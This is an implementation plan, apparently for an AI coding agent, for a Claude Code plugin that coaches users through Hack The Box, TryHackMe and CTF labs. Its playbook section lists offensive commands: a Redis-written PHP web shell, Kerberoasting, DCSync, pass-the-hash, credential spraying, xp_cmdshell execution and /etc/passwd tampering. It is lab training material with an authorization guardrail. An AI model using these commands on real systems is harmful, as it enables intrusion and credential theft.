# Pwn Challenge Plugin Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build and package a Claude Code plugin (`pwn-challenge`) that coaches the user through HTB / THM / CTF challenges with tiered hints, per-target notes, and safe auto-enumeration.

**Architecture:** A Claude Code plugin whose source is this repo. Ships one skill (`skills/pwn-challenge/`) plus one slash command (`commands/pwn.md`). Per-engagement state lives in the user's working directory under `targets/<name>/`. Spec: `docs/superpowers/specs/2026-05-11-pwn-challenge-skill-design.md`.

**Tech Stack:** Markdown (skill + command files), JSON (plugin manifest), Bash (used by skill at runtime, not built). No build step or test framework — verification is by installing the plugin locally and exercising it in Claude Code.

**Note on TDD:** The deliverables are markdown/JSON content for a Claude Code plugin, not executable code. Tasks below replace "write failing test" with concrete *verification steps* that prove each piece works (file present, manifest valid, plugin discoverable, slash command registers, skill activates on keywords).

**Note on git:** Do **not** run `git init`, `git add`, `git commit`, or `git tag` in any task. The user reviews all files and handles git themselves.

---

## File Structure

```
HackerSkill/
├── .claude-plugin/
│   └── plugin.json
├── skills/
│   └── pwn-challenge/
│       ├── SKILL.md
│       └── references/
│           ├── playbook.md
│           └── target-template.md
├── commands/
│   └── pwn.md
├── README.md
└── docs/superpowers/                         # already exists
    ├── specs/2026-05-11-pwn-challenge-skill-design.md
    └── plans/2026-05-11-pwn-challenge.md     # this file
```

Responsibilities:

- `.claude-plugin/plugin.json` — plugin metadata for Claude Code discovery.
- `skills/pwn-challenge/SKILL.md` — main instructions Claude follows: lifecycle phases, hint tiers, execution rules, authorization guardrail, references to playbook/template loaded on demand.
- `skills/pwn-challenge/references/target-template.md` — markdown template the skill copies when starting a new target.
- `skills/pwn-challenge/references/playbook.md` — service-by-service and context-by-context offensive technique reference, loaded on demand by SKILL.md.
- `commands/pwn.md` — `/pwn` slash command definition with subcommand routing (`<target> <ip>`, `<target>`, no-args, `done`).
- `README.md` — user-facing install + usage docs.

---

## Task 1: Plugin manifest

**Files:**
- Create: `.claude-plugin/plugin.json`

- [ ] **Step 1: Verify parent directory does not yet exist**

Run: `ls -la /Users/mikeflynn/Code/InfoSec/HackerSkill/.claude-plugin 2>&1`
Expected: `No such file or directory`

- [ ] **Step 2: Create the manifest**

Create `.claude-plugin/plugin.json` with exactly:

```json
{
  "name": "pwn-challenge",
  "version": "0.1.0",
  "description": "Full-lifecycle coach for HTB, THM, and CTF challenges with tiered hints, per-target notes, and safe auto-enumeration.",
  "author": {
    "name": "Mike Flynn",
    "email": "mike@c33tech.com"
  }
}
```

- [ ] **Step 3: Verify it parses as JSON**

Run: `python3 -c "import json; print(json.load(open('/Users/mikeflynn/Code/InfoSec/HackerSkill/.claude-plugin/plugin.json'))['name'])"`
Expected: `pwn-challenge`

---

## Task 2: Target notes template

**Files:**
- Create: `skills/pwn-challenge/references/target-template.md`

- [ ] **Step 1: Create the template**

Create `skills/pwn-challenge/references/target-template.md` with exactly:

```markdown
# {{TARGET}} ({{IP}})

**Status:** recon
**Platform:** {{PLATFORM}}
**Difficulty:** unknown  **OS:** unknown
**Started:** {{DATE}}

## Targets
- IP: {{IP}}
- Hostname(s):

## Recon
### Open ports / services
### Web enum
### Other service enum

## Findings
- Creds:
- Users:
- Interesting files / endpoints:
- Versions / CVEs noted:

## Attack chain
### Foothold
- Vector:
- Evidence:
- Commands that worked:

### Lateral / privilege escalation
### Root

## Flags
- user flag:
- root flag:

## Hints given
- Tier 1:
- Tier 2:
- Tier 3:

## Things tried (didn't work)
-

## Open questions / next steps
-
```

- [ ] **Step 2: Verify file exists and contains required sections**

Run: `grep -c -E '^## (Targets|Recon|Findings|Attack chain|Flags|Hints given)' /Users/mikeflynn/Code/InfoSec/HackerSkill/skills/pwn-challenge/references/target-template.md`
Expected: `6`

---

## Task 3: Playbook reference

**Files:**
- Create: `skills/pwn-challenge/references/playbook.md`

This file is dense reference content. Keep entries short (3-8 bullets each). The skill loads only relevant sections on demand, so headers must be predictable so the skill can grep for them.

- [ ] **Step 1: Create the playbook with all required sections**

Create `skills/pwn-challenge/references/playbook.md` with this exact section skeleton, populated with concrete commands and pointers under each:

```markdown
# Pwn Playbook

Section headers below are stable — the skill greps for them by name to load
on-demand. Keep entries short and command-oriented. Prefer HackTricks /
GTFOBins / LOLBAS as canonical external references.

## Services

### SMB (445, 139)
- Enumerate: `enum4linux-ng -A <ip>`, `smbclient -L //<ip>/ -N`, `nxc smb <ip> -u '' -p ''`
- Shares: `smbclient //<ip>/<share> -N`, `smbmap -H <ip>`
- Null session / guest? Try anonymous on every share.
- Writable share → drop `.scf` / `.url` for NTLM hash capture (responder running).
- Known versions: EternalBlue (MS17-010) on SMBv1 — check `nmap --script smb-vuln-ms17-010`.
- See HackTricks: pentesting-smb.

### FTP (21)
- Anonymous? `ftp <ip>` user `anonymous` pass any.
- `nmap -sV -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <ip>`.
- Writable? Combined with LFI/RFI or webroot upload, can become RCE.

### SSH (22)
- Version banner: `nc <ip> 22`. Check for known CVEs by version.
- Username enumeration on old OpenSSH (<= 7.7): CVE-2018-15473.
- Have creds? `ssh user@<ip>`. Try common passwords only if rules permit.
- Private key found? `chmod 600 key && ssh -i key user@<ip>`.

### HTTP / HTTPS (80, 443, 8080, 8443)
- Fingerprint: `whatweb <url>`, `curl -I <url>`, `wafw00f <url>`.
- Directory enum: `feroxbuster -u <url> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html`.
- Vhost enum: `ffuf -u http://<ip>/ -H "Host: FUZZ.<host>" -w <wordlist> -fs <baseline-size>`.
- Inspect: source, JS files, robots.txt, sitemap.xml, /.git/, /.env, /backup.
- Tech-specific: WordPress → `wpscan`; Drupal → `droopescan`; Joomla → `joomscan`.
- Common vuln classes: LFI, SSTI, SSRF, deserialization, auth bypass, IDOR.

### RDP (3389)
- `nmap --script rdp-enum-encryption,rdp-ntlm-info -p3389 <ip>`.
- BlueKeep (CVE-2019-0708) on unpatched Win7/2008.
- With creds: `xfreerdp /v:<ip> /u:user /p:pass +clipboard /dynamic-resolution`.

### WinRM (5985, 5986)
- With creds: `evil-winrm -i <ip> -u user -p pass`.
- Cred spray: `nxc winrm <ip> -u users.txt -p passwords.txt`.

### LDAP (389, 636)
- Anonymous bind: `ldapsearch -x -H ldap://<ip> -s base namingcontexts`.
- Dump: `ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=local"`.
- With creds: `nxc ldap <ip> -u user -p pass --users --groups`.

### Kerberos (88)
- User enum: `kerbrute userenum -d domain.local --dc <ip> users.txt`.
- AS-REP roasting (no preauth): `impacket-GetNPUsers domain.local/ -dc-ip <ip> -usersfile users.txt`.
- Kerberoasting (creds needed): `impacket-GetUserSPNs domain.local/user:pass -dc-ip <ip> -request`.

### MSSQL (1433)
- `nxc mssql <ip> -u user -p pass`.
- xp_cmdshell for RCE when sysadmin: enable then `EXEC xp_cmdshell 'whoami'`.
- Impersonation: check with `SELECT * FROM sys.server_principals WHERE is_disabled = 0`.

### MySQL / MariaDB (3306)
- `mysql -h <ip> -u root -p`. Try `root` / empty.
- Read files: `SELECT LOAD_FILE('/etc/passwd')` if FILE priv.
- UDF privesc on writable plugin_dir.

### Redis (6379)
- `redis-cli -h <ip>`. Try `INFO`, `CONFIG GET *`.
- Webroot write: `CONFIG SET dir /var/www/html`, `CONFIG SET dbfilename shell.php`, `SET x "<?php system($_GET['c']); ?>"`, `SAVE`.
- SSH key write: same trick, dump pub key into `~/.ssh/authorized_keys`.

### SNMP (161/udp)
- `snmpwalk -v2c -c public <ip>`.
- Try community strings: public, private, manager.
- Windows: `1.3.6.1.4.1.77.1.2.25` for users, `1.3.6.1.2.1.25.4.2.1.2` for processes.

### NFS (2049)
- `showmount -e <ip>`.
- Mount: `mount -t nfs <ip>:/share /mnt/nfs`.
- no_root_squash + writable → drop SUID binary for privesc.

## Contexts

### Linux privilege escalation
- Run: `linpeas.sh`. Triage output by red/yellow flags.
- SUID: `find / -perm -4000 -type f 2>/dev/null`. Cross-reference GTFOBins.
- Sudo: `sudo -l`. Cross-reference GTFOBins (`sudo` column).
- Capabilities: `getcap -r / 2>/dev/null`. Check for cap_setuid, cap_dac_read_search.
- Cron: `cat /etc/crontab`, `ls -la /etc/cron.*`. Writable script or PATH abuse.
- Writable /etc/passwd? Add a root entry with known password.
- Kernel exploits (last resort): `uname -r`, check exploit-db.

### Windows privilege escalation
- Run: `winPEAS.exe` or `Seatbelt.exe -group=all`.
- `whoami /priv` — SeImpersonate / SeAssignPrimaryToken → JuicyPotato / PrintSpoofer / GodPotato.
- Unquoted service paths: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"`.
- Weak service permissions: `accesschk.exe -uwcqv "Authenticated Users" *`.
- Stored creds: `cmdkey /list`, registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`.
- Always-install-elevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`.

### Active Directory attack paths
- Recon: `bloodhound-python -u user -p pass -d domain.local -ns <ip> -c all`.
- Kerberoast: `impacket-GetUserSPNs ... -request`, crack with hashcat `-m 13100`.
- AS-REP roast (DONT_REQ_PREAUTH): `impacket-GetNPUsers ... -no-pass`, crack with `-m 18200`.
- DCSync (with DA-equivalent rights or specific ACLs): `impacket-secretsdump -just-dc domain/user:pass@<dc>`.
- Pass-the-hash: `nxc smb <ip> -u user -H <nthash>`.
- Constrained / unconstrained delegation, ACL abuse, GenericAll / WriteDACL: BloodHound shows paths.

### Web vulnerability classes
- **LFI** → check `?file=`, `?page=`, `?include=`. Try `php://filter/convert.base64-encode/resource=index.php`. Log poisoning → RCE.
- **SSTI** → identify engine first (`{{7*7}}` vs `${7*7}` vs `<%= 7*7 %>`). PayloadsAllTheThings → SSTI section.
- **SSRF** → internal services, cloud metadata `169.254.169.254`, gopher://.
- **Deserialization** → ysoserial (Java), pickle (Python), node-serialize (Node).
- **SQLi** → `sqlmap -u <url> --batch --risk=2 --level=3`. Manual: `' OR 1=1--`, time-based for blind.
- **File upload** → bypass extension filters, content-type, magic bytes; race conditions on validators.
```

- [ ] **Step 2: Verify all required section anchors exist**

Run:
```bash
for s in "## Services" "### SMB" "### HTTP" "### Kerberos" "## Contexts" "### Linux privilege escalation" "### Windows privilege escalation" "### Active Directory attack paths" "### Web vulnerability classes"; do
  grep -qF "$s" /Users/mikeflynn/Code/InfoSec/HackerSkill/skills/pwn-challenge/references/playbook.md && echo "OK: $s" || echo "MISSING: $s"
done
```
Expected: every line begins with `OK:`.

---

## Task 4: SKILL.md — main skill instructions

**Files:**
- Create: `skills/pwn-challenge/SKILL.md`

This is the core file. It must include frontmatter with a `description` that the harness uses both to decide when to activate the skill and to surface it to the user.

- [ ] **Step 1: Create SKILL.md**

Create `skills/pwn-challenge/SKILL.md` with exactly:

```markdown
---
name: pwn-challenge
description: Full-lifecycle coach for HTB / TryHackMe / CTF challenges. Use when the user mentions hackthebox, htb, tryhackme, thm, ctf, working a "box", target IPs in 10.10.10.x / 10.10.11.x / 10.129.x.x, references user.txt / root.txt / flag.txt, pastes nmap output, or asks for help on an offensive-security challenge. Tracks per-target state in targets/<name>/notes.md, gives tiered hints (nudge → technique → solution), auto-runs safe enumeration, and confirms before exploitation or auth attempts.
---

# Pwn Challenge

You are coaching the user through an authorized offensive-security challenge
(HTB, TryHackMe, CTF, or similar lab). The user is an intermediate operator —
do not over-explain basics, but do explain *why* a suggested step matters when
nudging.

## Authorization

Engage only when the user has stated the target is a lab / CTF / authorized
engagement, or the target IP falls within known lab ranges
(10.10.10.0/24, 10.10.11.0/24, 10.129.0.0/16). If the user points you at an IP
outside these ranges without stating explicit authorization, ask before
proceeding. Refuse to assist with unauthorized targets.

## State

Each engagement has a directory in the user's current working directory:

```
targets/
├── .current                   # name of active target (single line)
└── <target>/
    ├── notes.md               # primary state file
    ├── scans/                 # raw tool output
    └── loot/                  # creds, hashes, downloaded binaries
```

`notes.md` is the source of truth. **Read the entire `notes.md` at the start of
every turn** so you have full state. Append or edit specific sections; never
silently rewrite prior content.

The template lives at `references/target-template.md`. Load it when starting a
new target. Substitute `{{TARGET}}`, `{{IP}}`, `{{PLATFORM}}`, `{{DATE}}`.

### Identifying the active target

When invoked, identify the active target by trying in order:
1. Target named explicitly in the user's message.
2. Contents of `targets/.current`.
3. Most recently modified `targets/*/notes.md`.
4. Ask the user.

Write the active target name to `targets/.current` whenever you switch.

## Lifecycle phases

Track one phase per target in the `Status:` field of `notes.md`:

1. **recon** — port/service discovery, web/SMB/etc. enumeration.
2. **foothold** — turning a finding into initial shell or auth access.
3. **priv-esc** — local enumeration, user → root (or lateral on AD).
4. **rooted** — both flags captured, writeup mode.

Before suggesting next work, check `notes.md` to see what is already done in
the current phase. Do not re-suggest enumeration that has already been
recorded.

### Phase checklists (apply against `notes.md`)

- **recon:** full TCP scan, version detect (`-sC -sV`), top UDP, web tech
  fingerprint on every HTTP service, directory/vhost enum on every HTTP
  service, service-specific enum for each open port.
- **foothold:** correlate findings with known CVEs / default creds / web
  vulns. The playbook section for the target service is the starting point.
- **priv-esc:** baseline (`id`, `uname -a`, `whoami /priv`), then linpeas /
  winPEAS, then targeted checks based on findings.
- **rooted:** record both flags, summarize the attack chain in `notes.md`,
  offer writeup.

## Tiered hint protocol

Default to **Tier 1**. Escalate only when the user asks.

- **Tier 1 (nudge):** Point at an area. Do not name the technique.
  Example: *"You enumerated SMB but did not check for null sessions on shares
  — worth a look."*
- **Tier 2 (technique):** Name the tool or class of attack. Do not give the
  exact payload.
  Example: *"That CMS version has a known LFI. Look at how `file=` is
  handled."*
- **Tier 3 (solution):** Provide the command, payload, or exploit.

User escalation phrases: "more", "next hint", "give it to me", "show me".
Overrides:
- "spoil it" / "solve mode" → Tier 3 for the current question only.
- "no spoilers" → lock to Tier 1 until "hints ok".

After giving any hint, append it under **Hints given** in `notes.md` so you
don't repeat.

## Execution rules

Classify every command into one of three buckets.

### Auto-run (no prompt; run via Bash)

- Port/service scans: `nmap` with non-intrusive flags, `rustscan`.
- Web fingerprinting: `whatweb`, `curl -I`, `wafw00f`.
- Directory/vhost enumeration: `gobuster`, `ffuf`, `feroxbuster`.
- DNS/SMB info: `dig`, `smbclient -L`, `enum4linux -A`, `rpcclient` info-only
  queries.
- Read-only commands on shells the user has already established (`ls`, `cat`,
  `id`, `uname`, `whoami`, `env`).

Tee output to `targets/<target>/scans/<tool>-<UTC-timestamp>.txt` and append a
one-line summary to the relevant `notes.md` section.

### Confirm first (propose, wait for explicit "yes")

- Any authentication attempt: `hydra`, `nxc`/`crackmapexec` with credentials,
  SSH/WinRM/RDP login.
- Exploit execution: Metasploit modules, public PoCs, custom payloads.
- Anything spawning a reverse or bind shell.
- Password cracking with significant CPU cost (`hashcat` / `john` with large
  wordlists).
- Writes or uploads to the target.

Preface each proposal with a one-line *why*.

### Never auto

- Destructive actions on target (`rm`, service stop, format).
- Anything touching hosts outside the assigned target IP.
- Bruteforce against rate-limited or lockout-prone services without explicit
  user authorization for that specific service.

## Playbook

`references/playbook.md` is the curated reference. Load it on demand — not at
activation — and read only the sections relevant to current findings. Stable
section headers:

- `### SMB`, `### FTP`, `### SSH`, `### HTTP`, `### RDP`, `### WinRM`,
  `### LDAP`, `### Kerberos`, `### MSSQL`, `### MySQL`, `### Redis`,
  `### SNMP`, `### NFS`.
- `### Linux privilege escalation`, `### Windows privilege escalation`,
  `### Active Directory attack paths`, `### Web vulnerability classes`.

For specific CVEs, exploits, or current syntax not in the playbook, prefer:

1. HackTricks (book.hacktricks.xyz)
2. GTFOBins / LOLBAS for binary abuse
3. exploit-db / GitHub for PoCs
4. General WebSearch as fallback

## Workflow per turn

1. Read `targets/.current` and the active target's `notes.md` in full.
2. Identify the current phase and what is and isn't done.
3. If the user asked a direct question, answer it at the appropriate hint
   tier.
4. If the user asked "what next?" / "stuck", give a Tier 1 nudge based on the
   phase checklist and current findings.
5. If a command should run, classify it (auto / confirm / never) and proceed
   accordingly.
6. After any tool output, update `notes.md`: append findings, update
   `Status:` if the phase changed, log any hint given.

## Writeup

When the user says `/pwn done` or both flags are captured, offer to generate a
writeup from `notes.md`: target overview, attack chain (foothold → priv esc),
key commands, lessons learned. Save to `targets/<target>/writeup.md`.
```

- [ ] **Step 2: Verify frontmatter parses and required keywords are present**

Run:
```bash
head -5 /Users/mikeflynn/Code/InfoSec/HackerSkill/skills/pwn-challenge/SKILL.md
```
Expected: starts with `---`, contains `name: pwn-challenge` and `description:` field on one line.

Run:
```bash
for kw in hackthebox htb tryhackme thm ctf "10.10.10" "10.10.11" "10.129" user.txt root.txt flag.txt nmap; do
  grep -qF "$kw" /Users/mikeflynn/Code/InfoSec/HackerSkill/skills/pwn-challenge/SKILL.md && echo "OK: $kw" || echo "MISSING: $kw"
done
```
Expected: every line `OK:`.

---

## Task 5: `/pwn` slash command

**Files:**
- Create: `commands/pwn.md`

The command is a markdown file with frontmatter describing arguments. Its body is the prompt Claude executes when invoked.

- [ ] **Step 1: Create the command file**

Create `commands/pwn.md` with exactly:

```markdown
---
description: Start, resume, or manage a pwn-challenge target (HTB / THM / CTF). Usage — `/pwn <target> <ip>` to start, `/pwn <target>` to resume, `/pwn` to list, `/pwn done` to finish.
argument-hint: [target] [ip] | done | (empty)
---

The user invoked `/pwn` with arguments: `$ARGUMENTS`

Engage the **pwn-challenge** skill and handle the invocation as follows.

## Argument parsing

- **No arguments:** list every directory under `./targets/` along with the
  `Status:` line from its `notes.md`. Ask which the user wants to resume.
  If `./targets/` does not exist, say so and explain `/pwn <target> <ip>`
  starts a new one.

- **Single argument `done`:** the active target (from `targets/.current`) is
  complete. Update its `notes.md` `Status:` to `rooted`, offer to generate a
  writeup at `targets/<target>/writeup.md` from the notes.

- **Single argument (target name):** resume that target.
  1. Verify `targets/<target>/notes.md` exists. If not, tell the user and
     suggest `/pwn <target> <ip>` to start.
  2. Write the target name to `targets/.current`.
  3. Read the entire `notes.md`.
  4. Summarize current phase, known findings, and last activity in 3–6 lines.
  5. Ask where to focus.

- **Two arguments (target name, ip):** start a new target.
  1. Create `targets/<target>/`, `targets/<target>/scans/`,
     `targets/<target>/loot/` if they do not exist.
  2. Read the template at the pwn-challenge skill's
     `references/target-template.md`. Substitute `{{TARGET}}` with the target
     name, `{{IP}}` with the IP, `{{PLATFORM}}` with `unknown` (ask the user
     later), `{{DATE}}` with today's date in YYYY-MM-DD.
  3. Write the substituted content to `targets/<target>/notes.md`.
  4. Write the target name to `targets/.current`.
  5. Kick off an initial nmap scan (auto-run, per the skill's execution
     rules):
     `nmap -sC -sV -T4 -oN targets/<target>/scans/nmap-initial.txt <ip>`.
  6. When the scan completes, parse open ports/services and append a summary
     to the `### Open ports / services` section of `notes.md`.
  7. Recommend next steps based on which services are open, drawing on the
     playbook's `## Services` sections.

## After handling the invocation

Continue the session in the **pwn-challenge** skill's normal workflow: read
`notes.md` at the start of each subsequent turn, default hint tier 1, classify
commands before running them.
```

- [ ] **Step 2: Verify frontmatter and argument branches present**

Run:
```bash
head -4 /Users/mikeflynn/Code/InfoSec/HackerSkill/commands/pwn.md
```
Expected: starts with `---`, includes `description:` and `argument-hint:`.

Run:
```bash
for s in "No arguments" "argument \`done\`" "Single argument (target name)" "Two arguments"; do
  grep -qF "$s" /Users/mikeflynn/Code/InfoSec/HackerSkill/commands/pwn.md && echo "OK: $s" || echo "MISSING: $s"
done
```
Expected: every line `OK:`.

---

## Task 6: README

**Files:**
- Create: `README.md`

- [ ] **Step 1: Create the README**

Create `README.md` with exactly:

````markdown
# pwn-challenge

A Claude Code plugin that coaches you through Hack The Box, TryHackMe, and CTF
challenges. Tracks per-target state in a markdown notes file, runs safe
enumeration automatically, and gives tiered hints so you keep learning instead
of getting handed the solution.

## What it does

- **Full lifecycle:** recon → foothold → privilege escalation → rooted.
- **Per-target notes:** `targets/<name>/notes.md` is the source of truth.
  Scans go to `scans/`, loot to `loot/`.
- **Tiered hints:** nudge → technique → solution. You escalate when you want.
- **Hybrid execution:** auto-runs nmap, gobuster, whatweb, smbclient, etc.
  Confirms before exploits, auth attempts, or shells.
- **Curated playbook + web lookups:** service-by-service techniques baked in;
  reaches out to HackTricks / GTFOBins / exploit-db on demand.

## Install

```text
/plugin marketplace add <github-user>/HackerSkill
/plugin install pwn-challenge
```

Restart Claude Code (or reload plugins) so the skill and `/pwn` command
register.

## Requirements

The plugin shells out to standard offensive-security tools. Have these on your
`$PATH`:

- `nmap`, `rustscan` (optional)
- `gobuster` / `ffuf` / `feroxbuster`
- `whatweb`, `curl`, `wafw00f`
- `enum4linux-ng`, `smbclient`, `smbmap`, `nxc` (NetExec)
- `evil-winrm` (for WinRM targets)
- `impacket-*` suite (for Kerberos / AD)
- `hashcat` or `john` (for cracking)

The skill works without all of them — it just won't run the missing tools.

## Quick start

```text
/pwn lame 10.10.10.3
```

Starts a new target called `lame`, creates `targets/lame/`, drops a notes
template, and kicks off an initial nmap scan.

Resume later:

```text
/pwn lame
```

List all targets:

```text
/pwn
```

Wrap up a rooted box:

```text
/pwn done
```

## Hint controls

- "hint" / "what next?" → Tier 1 nudge
- "more" / "next hint" → escalate one tier
- "spoil it" / "solve mode" → Tier 3 (just this question)
- "no spoilers" → lock to Tier 1 until "hints ok"

## Authorization

This plugin assists with **authorized** lab / CTF / engagement targets only.
The skill will refuse or ask for confirmation if pointed at IPs outside known
lab ranges (10.10.10.0/24, 10.10.11.0/24, 10.129.0.0/16) without explicit
authorization context.

## Update / uninstall

```text
/plugin update pwn-challenge
/plugin uninstall pwn-challenge
```
````

- [ ] **Step 2: Verify install commands are present**

Run:
```bash
for s in "/plugin marketplace add" "/plugin install pwn-challenge" "/pwn lame 10.10.10.3"; do
  grep -qF "$s" /Users/mikeflynn/Code/InfoSec/HackerSkill/README.md && echo "OK: $s" || echo "MISSING: $s"
done
```
Expected: every line `OK:`.

---

## Task 7: Local install verification

**Files:** none modified

This task confirms the plugin loads in Claude Code on this machine. It is a
manual smoke test — the steps below tell the engineer what to do and what to
look for.

- [ ] **Step 1: Verify file tree**

Run:
```bash
find /Users/mikeflynn/Code/InfoSec/HackerSkill -type f \
  \( -name "plugin.json" -o -name "SKILL.md" -o -name "pwn.md" \
     -o -name "playbook.md" -o -name "target-template.md" -o -name "README.md" \) \
  | sort
```
Expected (six lines, paths in this order):
```
/Users/mikeflynn/Code/InfoSec/HackerSkill/.claude-plugin/plugin.json
/Users/mikeflynn/Code/InfoSec/HackerSkill/README.md
/Users/mikeflynn/Code/InfoSec/HackerSkill/commands/pwn.md
/Users/mikeflynn/Code/InfoSec/HackerSkill/skills/pwn-challenge/SKILL.md
/Users/mikeflynn/Code/InfoSec/HackerSkill/skills/pwn-challenge/references/playbook.md
/Users/mikeflynn/Code/InfoSec/HackerSkill/skills/pwn-challenge/references/target-template.md
```

- [ ] **Step 2: Validate JSON**

Run: `python3 -m json.tool /Users/mikeflynn/Code/InfoSec/HackerSkill/.claude-plugin/plugin.json > /dev/null && echo OK`
Expected: `OK`.

- [ ] **Step 3: Install the plugin locally for smoke test**

Ask the user to run, in a fresh Claude Code session in any directory:

```text
/plugin install /Users/mikeflynn/Code/InfoSec/HackerSkill
```

(If local-path install is not supported by the user's Claude Code version,
they instead symlink the repo into `~/.claude/plugins/pwn-challenge` and
restart Claude Code.)

Then:
- Confirm `/pwn` appears in the slash-command list.
- Run `/pwn` with no arguments. Expected: the command runs and reports that no
  `./targets/` directory exists.
- Mention "hackthebox" in a fresh message in an unrelated cwd. Expected: the
  skill activates and asks which target.

Report any failure modes back. The user will commit and tag after review.

---

## Self-Review

**Spec coverage:**
- Architecture / file layout → Tasks 1, 2, 3, 4, 5, 6 (one task per file)
- Lifecycle phases → Task 4 (SKILL.md "Lifecycle phases" section)
- Notes file template → Task 2
- Tiered hint protocol → Task 4
- Execution rules (auto/confirm/never) → Task 4
- Playbook & web lookups → Tasks 3, 4
- `/pwn` slash command (all four argument forms) → Task 5
- Auto-activation → Task 4 (description frontmatter + keywords verified in Step 2)
- Authorization guardrail → Task 4 (Authorization section)
- Installation & distribution → Tasks 1, 6, 7

**Placeholder scan:** no "TBD" / "TODO" / "fill in" in any task. Every code/markdown block is complete.

**Type / name consistency:** `pwn-challenge` is the plugin name in plugin.json (Task 1), the SKILL.md `name:` field (Task 4), the install command (Task 6), and the directory under `skills/` (Task 4). `/pwn` is the command in pwn.md (Task 5), README examples (Task 6), and SKILL.md writeup section (Task 4). `targets/` root and `targets/.current` pointer are consistent across Tasks 4 and 5. Playbook section headers used in SKILL.md (Task 4) match those defined in Task 3.

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-05-11-pwn-challenge.md`. Two execution options:

1. **Subagent-Driven (recommended)** — fresh subagent per task, review between tasks, fast iteration.
2. **Inline Execution** — execute tasks in this session with checkpoints.

Which approach?
